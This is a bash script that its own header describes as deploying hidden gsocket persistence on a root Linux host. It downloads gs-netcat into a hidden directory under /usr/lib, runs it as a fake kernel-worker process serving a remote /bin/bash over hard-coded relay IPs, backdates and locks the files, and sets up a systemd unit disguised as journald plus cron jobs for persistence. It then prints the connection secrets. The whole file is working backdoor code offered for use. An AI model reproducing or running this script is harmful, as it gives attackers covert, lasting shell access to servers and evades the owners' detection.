#!/bin/bash
# gs_e02.sh — deploy hidden gsocket persistence on a Linux root host (Proxmox)
exec >/tmp/gs_deploy.log 2>&1
set -u
echo "=== HOST $(hostname) $(id -un) $(date -u) ==="
df -h / | tail -1
echo "usrlib=$(findmnt -T /usr/lib -o OPTIONS -n 2>/dev/null)"
echo "etc=$(findmnt -T /etc -o OPTIONS -n 2>/dev/null)"

# --- relay selection ---
RELAY=""; PORT=443
for r in 43.156.225.5 51.91.190.242; do
  if timeout 6 bash -c "echo >/dev/tcp/$r/$PORT" 2>/dev/null; then RELAY=$r; break; fi
done
echo "RELAY=${RELAY:-DEFAULT}"

# --- dir ---
D=/usr/lib/.syscache-7f3a91
mkdir -p "$D" 2>/dev/null || { D=/var/lib/.systemd-7f3a91; mkdir -p "$D"; }
echo "DIR=$D"
cd "$D" || exit 1

# --- binary ---
if [ ! -s .kworker ]; then
  curl -fsSL -o .kworker https://github.com/hackerschoice/gsocket.io/raw/refs/heads/gh-pages/bin/gs-netcat_mini-linux-x86_64 \
   || curl -fsSL -o .kworker https://cdn.gsocket.io/bin/gs-netcat_mini-linux-x86_64 \
   || cp -f /tmp/.kb .kworker 2>/dev/null
fi
chmod 700 .kworker
file .kworker | head -1
SZ=$(wc -c < .kworker); echo "BINSZ=$SZ"
[ "$SZ" -gt 1000000 ] || { echo "BINARY_FAIL"; exit 1; }

# --- secrets ---
S1=$(head -c16 /dev/urandom|od -An -tx1|tr -d ' \n')
D1=$(head -c8  /dev/urandom|od -An -tx1|tr -d ' \n')
S2=$(head -c16 /dev/urandom|od -An -tx1|tr -d ' \n')
D2=$(head -c8  /dev/urandom|od -An -tx1|tr -d ' \n')
printf '%s' "$S1" > .k;  chmod 600 .k
printf '%s' "$S2" > .k2; chmod 600 .k2

ENV1="GSOCKET_HOST=$RELAY GSOCKET_PORT=$PORT GSOCKET_DOMAIN=$D1 GSOCKET_NO_GREETINGS=1"
[ -z "$RELAY" ] && ENV1="GSOCKET_DOMAIN=$D1 GSOCKET_NO_GREETINGS=1"
ENV2="GSOCKET_HOST=$RELAY GSOCKET_PORT=$PORT GSOCKET_DOMAIN=$D2 GSOCKET_NO_GREETINGS=1"
[ -z "$RELAY" ] && ENV2="GSOCKET_DOMAIN=$D2 GSOCKET_NO_GREETINGS=1"

# --- sync scripts (idempotent) ---
cat > .sync <<SYNC
#!/bin/sh
export $ENV1
D=$D
pgrep -f 'syscache-7f3a91/.kworker' >/dev/null 2>&1 && exit 0
cd /
/bin/bash -c "exec -a '[kworker/0:2]' \$D/.kworker -k \$D/.k -l -q -e /bin/bash" >/dev/null 2>&1 &
echo \$! > \$D/.pid
SYNC
cat > .sync2 <<SYNC
#!/bin/sh
export $ENV2
D=$D
pgrep -f 'syscache-7f3a91/.kworker.*-k' >/dev/null 2>&1 && exit 0
cd /
/bin/bash -c "exec -a '[kworker/2:1]' \$D/.kworker -k \$D/.k2 -l -q -e /bin/bash" >/dev/null 2>&1 &
SYNC
chmod 700 .sync .sync2

# --- fake mtime + immutable ---
REF=/usr/sbin/cron; [ -f "$REF" ] || REF=/lib/systemd/systemd-journald
for f in .kworker .k .k2 .sync .sync2; do
  chattr -i "$D/$f" 2>/dev/null
  touch -r "$REF" "$D/$f" 2>/dev/null
  chattr +i "$D/$f" 2>/dev/null
done
ls -la "$D" | head -8

# --- CH1: systemd unit ---
U=/etc/systemd/system/systemd-journald-cache.service
cat > "$U" <<UNIT
[Unit]
Description=Journal Cache Sync
After=network-online.target
Wants=network-online.target
[Service]
Type=oneshot
ExecStart=/bin/bash $D/.sync
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload 2>/dev/null
systemctl enable --now systemd-journald-cache.service 2>/dev/null
echo "CH1=$(systemctl is-active systemd-journald-cache.service 2>/dev/null)"

# --- CH2: cron ---
printf '%s\n' "*/2 * * * * root /bin/bash $D/.sync2" "@reboot root /bin/bash $D/.sync2" > /etc/cron.d/systemd-journald-cache 2>/dev/null
chmod 644 /etc/cron.d/systemd-journald-cache 2>/dev/null
printf '%s\n' "*/3 * * * * root /bin/bash $D/.sync" >> /etc/cron.d/systemd-journald-cache 2>/dev/null
/bin/bash "$D/.sync"
sleep 6
/bin/bash "$D/.sync2"
sleep 4

echo "=== RESULT ==="
echo "DIR=$D"
echo "RELAY=$RELAY"
echo "S1=$S1"
echo "D1=$D1"
echo "S2=$S2"
echo "D2=$D2"
echo "PROCS=$(ps -eo args | grep -c '[k]worker/[0-2]:[0-9]')"
ss -tn 2>/dev/null | grep -c ":443" | sed 's/^/ESTAB443=/'
echo "=== END ==="
